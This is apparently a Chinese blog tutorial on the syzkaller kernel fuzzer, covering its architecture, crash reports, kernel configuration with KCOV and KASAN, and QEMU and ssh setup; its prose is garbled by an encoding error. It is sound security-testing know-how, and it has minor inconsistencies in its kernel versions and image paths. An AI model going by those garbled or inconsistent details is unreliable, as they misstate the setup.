class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RunManager</span><span class="hljs-params">(cfg *mgrconfig.Config)</span></span> &#123;<br><span class="hljs-comment">// åˆ›å»º VM</span><br>    vmPool, err = vm.Create(cfg, *flagDebug)<br>    <span class="hljs-comment">// ... ç›®å½•ç›¸å…³çš„å¤„ç†</span><br>    <br>    <span class="hljs-comment">// åˆå§‹åŒ–å„ä¸ªå­ç»„ä»¶ï¼Œåå­—æ¯”è¾ƒè‡ªè§£é‡Š</span><br>reporter, err := report.NewReporter(cfg)<br>mgr := &amp;Manager&#123;...&#125;<br>mgr.preloadCorpus()<br>mgr.initStats()<br>mgr.initHTTP()<br>mgr.collectUsedFiles()<br>mgr.serv, err = startRPCServer(mgr)<br>    mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><br>    <span class="hljs-comment">// æ¯ 10 ç§’åœ¨ç»ˆç«¯æ‰“å°æ‰§è¡ŒçŠ¶æ€</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>            <span class="hljs-comment">// ... ä¸€äº›ç»Ÿè®¡æ•°æ®</span><br>corpusCover := mgr.stats.corpusCover.get()<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, ...&quot;</span>, numFuzzing, executed, corpusCover, ...)<br>&#125;<br>&#125;()<br>    <span class="hljs-comment">// å®šæœŸæ›´æ–° dashboard çš„çº¿ç¨‹</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">for</span> &#123;<br>            time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>            <span class="hljs-comment">// æ›´æ–°æ•°æ®</span><br>            mgr.dash.UpdateStats(&amp;mgr.stats)<br>        &#125;<br>    &#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RunManager</code> å‡½æ•°è´Ÿè´£åˆå§‹åŒ–æ•´ä¸ªç³»ç»Ÿï¼ŒåŒ…æ‹¬åˆ›å»ºè™šæ‹Ÿæœºã€æ”¶é›†ç»Ÿè®¡æ•°æ®ã€å¯åŠ¨ HTTP æœåŠ¡å’Œç®¡ç†çŠ¶æ€æ›´æ–°ã€‚ä¸»è¦ç»„ä»¶åŒ…æ‹¬ï¼š</p><ul><li>VMæ± ç®¡ç†ï¼ˆåˆ›å»ºå’Œé”€æ¯è™šæ‹Ÿæœºï¼‰</li><li>æŠ¥å‘Šç”Ÿæˆå’Œæ•°æ®å±•ç¤º</li><li>ç»Ÿè®¡ä¿¡æ¯æ”¶é›†</li><li>HTTP æ¥å£</li></ul><p>å½“ syscalls å’Œæ•°æ®æºè¢«é…ç½®å¥½åï¼Œ<code>syz-manager</code> ä¼šå¯åŠ¨ä¸€ä¸ª <code>RunManager</code> è¿‡ç¨‹æ¥åˆå§‹åŒ–æ‰€æœ‰èµ„æºå¹¶å¼€å§‹å·¥ä½œã€‚</p><hr><p>è¿™åªæ˜¯ <code>syzkaller</code> å·¥å…·é“¾çš„ä¸€ä¸ªç®€è¦ä»‹ç»ã€‚å¦‚æœä½ å¸Œæœ›æ›´è¯¦ç»†åœ°å­¦ä¹ ï¼Œå¯ä»¥é€æ­¥ç ”ç©¶ syzlang çš„å…·ä½“ç”¨æ³•ä»¥åŠå¦‚ä½•é…ç½®ä¸ç®¡ç†ä½ çš„ fuzz æµ‹è¯•ç¯å¢ƒã€‚</p><h3 id="syz-executor"><a href="#syz-executor" class="headerlink" title="syz-executor"></a>syz-executor</h3><p>Syzkallerä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„æ¥å­˜å‚¨ç¨‹åºï¼Œå„ä¸ªç»„ä»¶ä¹‹é—´éƒ½ä½¿ç”¨è¿™ç§ç»“æ„æ¥ä¼ é€’ç¨‹åºï¼Œè¿™ç§ç»“æ„èƒ½å¤Ÿå°†ç¨‹åºåºåˆ—åŒ–æˆç±»ä¼¼Cè¯­è¨€å‡½æ•°è°ƒç”¨çš„å½¢å¼ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r0 = <span class="hljs-built_in">open</span>(&amp;(<span class="hljs-number">0</span>x7f0000000000)=<span class="hljs-string">&quot;./file0&quot;</span>, <span class="hljs-number">0</span>x3, <span class="hljs-number">0</span>x9)<br><span class="hljs-function"><span class="hljs-title">read</span><span class="hljs-params">(r0, &amp;(<span class="hljs-number">0</span>x7f0000000000)</span></span>, <span class="hljs-number">42</span>)<br><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">(r0)</span></span><br></code></pre></td></tr></table></figure><p>ç¨‹åºä¼ ç»™<code>syz-executor</code>åï¼Œ<code>syz-executor</code>å†…éƒ¨ä¼šå°†ç¨‹åºè§£ææˆç³»ç»Ÿè°ƒç”¨çš„å½¢å¼æ¥æ‰§è¡Œã€‚</p><p><code>syz-executor</code>çš„æºä»£ç è·¯å¾„ä¸º<code>executor/executor.cc</code>ï¼Œå®ƒæ˜¯ç”¨C++ç¼–å†™çš„ç¨‹åºï¼Œå®é™…ä¸Šå¤§éƒ¨åˆ†ä»£ç æ˜¯Cè¯­è¨€å®ç°çš„ï¼Œåªæœ‰</p><p>å°‘æ•°æ˜¯ç”¨C++å®ç°çš„ã€‚</p><p><code>syz-manager</code>è´Ÿè´£ï¼š</p><ul><li>å¯åŠ¨&#x2F;é‡å¯&#x2F;ç›‘æ§ VM å®ä¾‹</li><li>å®é™…çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼ˆè¾“å…¥ç”Ÿæˆã€æ›´æ”¹ã€æœ€å°åŒ–ç­‰ï¼‰</li><li>æŒä¹…è¯­æ–™åº“å’Œå´©æºƒå­˜å‚¨</li></ul><p>å®ƒåœ¨å…·æœ‰ç¨³å®šå†…æ ¸çš„ä¸»æœºä¸Šè¿è¡Œï¼Œè¯¥å†…æ ¸ä¸ä¼šé‡åˆ°ç™½å™ªå£°æ¨¡ç³Šæµ‹è¯•ç¨‹åºè´Ÿè½½ã€‚</p><p><code>syz-manager</code>å¯åŠ¨è¿›ç¨‹ï¼ˆæ¯ä¸ª VM å†…ä¸€ä¸ªï¼‰ã€‚ä¸ RPC åˆå¹¶ä»¥æ¥æ”¶å¿…é¡»æ‰§è¡Œçš„ç¨‹åºå¹¶æŠ¥å‘Šç»“æœï¼ˆé”™è¯¯çŠ¶æ€ã€æ”¶é›†çš„è¦†ç›–ç‡ç­‰ï¼‰ã€‚<code>syz-executor</code> <code>syz-executor</code> <code>syz-manager</code></p><p>è¦æ‰§è¡Œç¨‹åºï¼Œè¯·å¯åŠ¨ç¬æ€å­è¿›ç¨‹ã€‚<code>syz-executor</code></p><p>æ¯ä¸ªç¬æ€å­è¿›ç¨‹æ‰§è¡Œå•ä¸ªè¾“å…¥ï¼ˆä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚å®ƒè¢«è®¾è®¡å¾—å°½å¯èƒ½ç®€å•ï¼ˆä¸å¹²æ‰°æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼‰ï¼Œç”¨ C++ ç¼–å†™ï¼Œç¼–è¯‘ä¸ºé™æ€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ã€‚</p><p><strong>syscallæè¿°</strong></p><p><strong>è¦†ç›–</strong></p><p>syzkaller æ˜¯ä¸€ç§è¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•ç¨‹åºã€‚</p><p><strong>å´©æºƒæŠ¥å‘Š</strong></p><p>æ‰¾åˆ°å´©æºƒç¨‹åºæ—¶ï¼Œå®ƒä¼šå°†æœ‰å…³å®ƒçš„ä¿¡æ¯ä¿å­˜åˆ°ç›®å½•ä¸­ã€‚è¯¥ç›®å½•åŒ…å«æ¯ä¸ªå”¯ä¸€å´©æºƒç±»å‹çš„ä¸€ä¸ªå­ç›®å½•ã€‚æ¯ä¸ªå­ç›®å½•éƒ½åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¸¦æœ‰æ ‡è¯†å´©æºƒçš„å”¯ä¸€å­—ç¬¦ä¸²ï¼ˆç”¨äºé”™è¯¯è¯†åˆ«å’Œé‡å¤æ•°æ®åˆ é™¤ï¼‰;ä»¥åŠæœ€å¤š 100 ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæµ‹è¯•æœºå™¨å´©æºƒä¸€å¯¹ï¼š</p><p><code>syzkaller``workdir/crashes``description``logN``reportN</code></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-bullet">-</span> <span class="hljs-string">crashes/</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">6e512290efa36515a7a27e53623304d20d1c3e</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">description</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report1</span><br>    ...<br>  <span class="hljs-bullet">-</span> <span class="hljs-string">77c578906abe311d06227b9dc3bffa4c52676f</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">description</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report0</span><br>    ...<br></code></pre></td></tr></table></figure><p>æè¿°æ˜¯ä½¿ç”¨ä¸€ç»„<a href="https://github.com/google/syzkaller/blob/master/pkg/report">æ­£åˆ™è¡¨è¾¾å¼</a>æå–çš„ã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ä¸åŒçš„å†…æ ¸æ¶æ„ï¼Œæˆ–è€…åªæ˜¯çœ‹åˆ°ä»¥å‰æœªè§è¿‡çš„å†…æ ¸é”™è¯¯æ¶ˆæ¯ï¼Œåˆ™å¯èƒ½éœ€è¦æ‰©å±•æ­¤é›†åˆã€‚</p><p><code>logN</code>æ–‡ä»¶åŒ…å«åŸå§‹æ—¥å¿—ï¼ŒåŒ…æ‹¬å†…æ ¸æ§åˆ¶å°è¾“å‡ºä»¥åŠå´©æºƒå‰æ‰§è¡Œçš„ç¨‹åºã€‚è¿™äº›æ—¥å¿—å¯ä»¥é¦ˆé€åˆ°å·¥å…·ä»¥è¿›è¡Œ<a href="https://github.com/google/syzkaller/blob/master/docs/reproducing_crashes.md">å´©æºƒå®šä½å’Œæœ€å°åŒ–</a>ï¼Œæˆ–ç”¨äº<a href="https://github.com/google/syzkaller/blob/master/docs/reproducing_crashes.md#from-execution-logs">æ‰‹åŠ¨å®šä½</a>çš„å·¥å…·ã€‚æ–‡ä»¶åŒ…å«ç»è¿‡åå¤„ç†å’Œç¬¦å·åŒ–çš„å†…æ ¸å´©æºƒæŠ¥å‘Šï¼ˆä¾‹å¦‚ KASAN æŠ¥å‘Šï¼‰ã€‚é€šå¸¸ï¼Œæ‚¨åªéœ€è¦ 1 å¯¹è¿™äº›æ–‡ä»¶ï¼ˆå³å’Œ ï¼‰ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½éƒ½æè¿°äº†ç›¸åŒçš„å†…æ ¸é”™è¯¯ã€‚ä½†æ˜¯ï¼Œå½“å´©æºƒçš„å¯é‡å¤æ€§ä¸ä½³æ—¶ï¼Œæˆ–è€…å¦‚æœæ‚¨åªæƒ³æŸ¥çœ‹ä¸€ç»„å´©æºƒæŠ¥å‘Šæ¥æ¨æ–­ä¸€äº›ç›¸ä¼¼ä¹‹å¤„æˆ–ä¸åŒä¹‹å¤„ï¼Œæœ€å¤šå¯ä¿å­˜ 100 ä¸ªæ–‡ä»¶ã€‚<code>syzkaller``syz-repro``syz-execprog``reportN``log0``report0``syzkaller</code></p><p>æœ‰ 3 ç§ç‰¹æ®Šç±»å‹çš„å´©æºƒï¼š</p><ul><li><code>no output from test machine</code>ï¼šæµ‹è¯•æœºå™¨ä¸äº§ç”Ÿä»»ä½•è¾“å‡º</li><li><code>lost connection to test machine</code>ï¼šä¸æœ¬æœºçš„ SSH è¿æ¥æ„å¤–å…³é—­</li><li><code>test machine is not executing programs</code>ï¼šè®¡ç®—æœºçœ‹èµ·æ¥å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œä½†é•¿æ—¶é—´æ²¡æœ‰æ‰§è¡Œä»»ä½•æµ‹è¯•ç¨‹åº</li></ul><p>å¾ˆå¯èƒ½ä½ ä¸ä¼šçœ‹åˆ°è¿™äº›å´©æºƒçš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæµ‹è¯•æœºå™¨æ²¡æœ‰è¾“å‡ºï¼Œåˆ™æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ”¾å…¥æŠ¥å‘Šä¸­ï¼‰ã€‚ æœ‰æ—¶ï¼Œè¿™äº›å´©æºƒæœ¬èº«è¡¨æ˜å­˜åœ¨é”™è¯¯ï¼ˆå°¤å…¶æ˜¯å½“æ‚¨åœ¨æ—¥å¿—ä¸­çœ‹åˆ° Go panic æ¶ˆæ¯æ—¶ï¼‰ã€‚ ç„¶è€Œï¼Œå®ƒä»¬é€šå¸¸æ„å‘³ç€å†…æ ¸é”å®šæˆ–ç±»ä¼¼çš„åæƒ…å†µï¼ˆä»¥ä¸‹æ˜¯ä»¥è¿™ç§æ–¹å¼å‘ç°çš„ bug çš„å‡ ä¸ªç¤ºä¾‹ï¼š<a href="https://groups.google.com/d/msg/syzkaller/zfuHHRXL7Zg/Tc5rK8bdCAAJ">1</a>ã€<a href="https://groups.google.com/d/msg/syzkaller/kY_ml6TCm9A/wDd5fYFXBQAJ">2</a>ã€<a href="https://groups.google.com/d/msg/syzkaller/OM7CXieBCoY/etzvFPX3AQAJ">3</a>ï¼‰ã€‚<code>reportN``syzkaller</code></p><h3 id="Syzkaller-æ¶æ„"><a href="#Syzkaller-æ¶æ„" class="headerlink" title="Syzkaller æ¶æ„"></a>Syzkaller æ¶æ„</h3><ol><li>syz-manager</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">å¯åŠ¨ï¼Œæ§åˆ¶ï¼Œé‡å¯<span class="hljs-keyword">vm</span><br>é€šè¿‡sshå°†syz-managerå¤åˆ¶åˆ°<span class="hljs-keyword">vm</span>ï¼Œå¹¶è¿è¡Œ<br>ä¿å­˜è¯­æ–™åº“<br></code></pre></td></tr></table></figure><ol start="2"><li>sys-fuzzer</li></ol><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">å˜å¼‚è¾“å…¥æ•°æ®<br>è¿è¡Œsyz-executor<br>é€šè¿‡<span class="hljs-function"><span class="hljs-keyword">rpc</span>å°†è§¦å‘æ–°è·¯å¾„çš„æ•°æ®ä¼ å›syz-manager</span><br></code></pre></td></tr></table></figure><ol start="3"><li>syz-executor</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¿è¡Œç³»ç»Ÿè°ƒç”¨<br></code></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æˆ‘ä»¬è¦ä½¿ç”¨ Syzkaller è¿›è¡Œ Linux å†…æ ¸çš„ Fuzz éœ€è¦ä»¥ä¸‹ç¯å¢ƒï¼š</p><ul><li>ç¼–è¯‘ Syzkaller é¡¹ç›®</li><li>Linux å†…æ ¸</li><li>ä¸€å°ç‰©ç†&#x2F;è™šæ‹Ÿæœº</li></ul><h3 id="ç¼–è¯‘Syzkaller"><a href="#ç¼–è¯‘Syzkaller" class="headerlink" title="ç¼–è¯‘Syzkaller"></a>ç¼–è¯‘Syzkaller</h3><p>å®‰è£… Go ç¼–è¯‘å™¨å’Œ C ç¼–è¯‘å™¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä¸‹è½½ Go 1.23.7</span><br>wget https://go.dev/dl/go1.23.7.linux-amd64.tar.gz<br><br><span class="hljs-comment"># è§£å‹åˆ° /usr/localï¼ˆéœ€è¦ sudo æƒé™ï¼‰</span><br><span class="hljs-built_in">sudo</span> tar -C /usr/local -xzf go1.23.7.linux-amd64.tar.gz<br><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆåªåœ¨å½“å‰ shell æœ‰æ•ˆï¼‰,å»ºè®®æ·»åŠ è¿›.bashrcæ–‡ä»¶</span><br><span class="hljs-built_in">export</span> GOROOT=/usr/local/go<br><span class="hljs-built_in">export</span> GOPATH=<span class="hljs-variable">$HOME</span>/go<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOROOT</span>/bin:<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><br><br><span class="hljs-built_in">sudo</span> apt install gcc<br><br><span class="hljs-comment"># ä¸å¼€ä»£ç†å»ºè®®é…ç½®Goå›½å†…ä»£ç†</span><br><span class="hljs-built_in">export</span> GOPROXY=https://goproxy.cn,direct<br></code></pre></td></tr></table></figure><p>å®‰è£…æ‰€éœ€çš„ä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£…æ‰€éœ€çš„ä¾èµ–</span><br>sudo apt update<br>sudo apt install build-essential clang llvm libncurses5-dev libssl-dev libelf-dev bc<br>sudo apt install make flex bison libncurses-dev libelf-dev libssl-dev<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘syzkallerï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller<br><span class="hljs-built_in">cd</span> syzkaller<br>make<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬éœ€è¦å¯¹å…¶å®ƒæ¶æ„ä¸‹çš„ç›®æ ‡è¿›è¡Œ Fuzzï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¿›è¡Œäº¤å‰ç¼–è¯‘ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">å¦‚ arm æ¶æ„çš„ç›®æ ‡</span><br>make CC=aarch64-linux-gnu-g++ TARGETARCH=arm64<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶ä¼šæ”¾åœ¨<code>syzkaller/bin/</code>ç›®å½•ä¸­ã€‚</p><h3 id="ç¼–è¯‘-Linux-å†…æ ¸"><a href="#ç¼–è¯‘-Linux-å†…æ ¸" class="headerlink" title="ç¼–è¯‘ Linux å†…æ ¸"></a>ç¼–è¯‘ Linux å†…æ ¸</h3><p>ä»¥å†…æ ¸ç‰ˆæœ¬ 5.14 ä¸ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --branch v5.15 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git<br><br><span class="hljs-built_in">cd</span> linux-5.15<br>make defconfig         <span class="hljs-comment"># ç”Ÿæˆé»˜è®¤é…ç½®ï¼ˆæ ¹æ®æ¶æ„ï¼‰</span><br>make kvm_guest.config  <br></code></pre></td></tr></table></figure><p>syzkaller æ‰€éœ€çš„åŠŸèƒ½ä¸»è¦æ˜¯å¯ç”¨ <code>KCOV</code> æ¥æ”¶é›†å†…æ ¸ coverageï¼Œå¹¶å¯ç”¨ <code>KASAN</code> æ¥æ£€æµ‹å†…å­˜é”™è¯¯ï¼š</p><p>ä¿®æ”¹é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim .config<br></code></pre></td></tr></table></figure><p>æ·»åŠ ä»¥ä¸‹é€‰é¡¹ï¼Œè¿™äº›éƒ½æ˜¯ä¸ºäº†è®©å†…æ ¸æ›´å¥½çš„è¢« Fuzzã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Coverage collection.</span>  <br>CONFIG_KCOV=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ˜¾ç¤ºè¦†ç›–ç‡å›¾åƒ</span><br>CONFIG_DEBUG_INFO=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Memory bug detector</span>  <br>CONFIG_KASAN=y  <br>CONFIG_KASAN_INLINE=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Required <span class="hljs-keyword">for</span> Debian Stretch</span>  <br>CONFIG_CONFIGFS_FS=y  <br>CONFIG_SECURITYFS=y<br></code></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶å¹¶ç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ä¿®æ”¹å®Œæˆåæ›´æ–°é…ç½®</span><br>make olddefconfig<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘</span><br>make -j$(nproc)<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘åï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="Qemu-é…ç½®"><a href="#Qemu-é…ç½®" class="headerlink" title="Qemu é…ç½®"></a>Qemu é…ç½®</h3><p>æˆ‘ä»¬é€šè¿‡ Qemu æ¥è¿è¡Œ Linux å†…æ ¸ã€‚</p><ul><li>å®‰è£… qemu</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install qemu-system-x86<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»º Image</li></ul><p>åˆ›å»ºä¸€ä¸ª Debian Stretch Linux é•œåƒï¼Œä½œä¸º VM çš„æ–‡ä»¶ç³»ç»Ÿï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install debootstrap<br><br><span class="hljs-comment">#è®¾ç½® IMAGE ä¸º Linux é¡¹ç›®è·¯å¾„</span><br><span class="hljs-built_in">export</span> IMAGE=<span class="hljs-string">&quot;/linux&quot;</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$IMAGE</span><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$IMAGE</span>/<br><span class="hljs-comment">#å¤åˆ¶syzkalleré¡¹ç›®toolsç›®å½•ä¸‹çš„create-image.shæ–‡ä»¶</span><br>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh  <br><span class="hljs-built_in">chmod</span> +x create-image.sh<br><span class="hljs-comment">#Linux é¡¹ç›®ä¸èƒ½å­˜åœ¨äºæŒ‚è½½ç›®å½•ä¸Šï¼Œå¦åˆ™ä¼šæŠ¥é”™</span><br>./create-image.sh<br></code></pre></td></tr></table></figure><p>å½“å‰ç›®å½•ä¸‹å¤šäº†å‡ ä¸ªæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">â¯ ls<br>bullseye  bullseye.id_rsa  bullseye.id_rsa.pub  bullseye.img  create-image.sh<br></code></pre></td></tr></table></figure><ul><li>å¯åŠ¨è™šæ‹Ÿæœº</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \  <br>  -m 2G \  <br>  -smp 2 \  <br>  -kernel /usr/class/linux/arch/x86/boot/bzImage \  <br>  -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \  <br>  -drive file=/usr/class/linux/image/stretch.img,format=raw \  <br>  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \  <br>  -net nic,model=e1000 \  <br>  -enable-kvm \  <br>  -nographic \  <br>  -pidfile vm.pid \  <br><span class="hljs-meta prompt_">  2&gt;</span><span class="language-bash">&amp;1 | <span class="hljs-built_in">tee</span> vm.log</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸçš„è¯ï¼Œå°±ä¼šå‡ºç° syzkaller loginã€‚ç”¨æˆ·åé”®å…¥<code>root</code>ï¼Œæ— éœ€è¾“å…¥å¯†ç ï¼Œå³å¯è¿›å…¥ç»ˆç«¯ï¼š</p><p>æˆ‘ä»¬æµ‹è¯• ssh æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œå› ä¸ºæˆ‘ä»¬çš„ syzkaller æ˜¯é€šè¿‡ ssh ä¼ è¾“æ–‡ä»¶çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -i /root/linux/image/bullseye.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>poweroff</code>æˆ‘ä»¬å¯ä»¥é€€å‡ºæ¨¡æ‹Ÿçš„ç³»ç»Ÿã€‚</p><h2 id="åŸºç¡€ä½¿ç”¨"><a href="#åŸºç¡€ä½¿ç”¨" class="headerlink" title="åŸºç¡€ä½¿ç”¨"></a>åŸºç¡€ä½¿ç”¨</h2><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><ul><li>è®¾ç½®é…ç½®æ–‡ä»¶</li></ul><p>ä¸º  Syzkaller 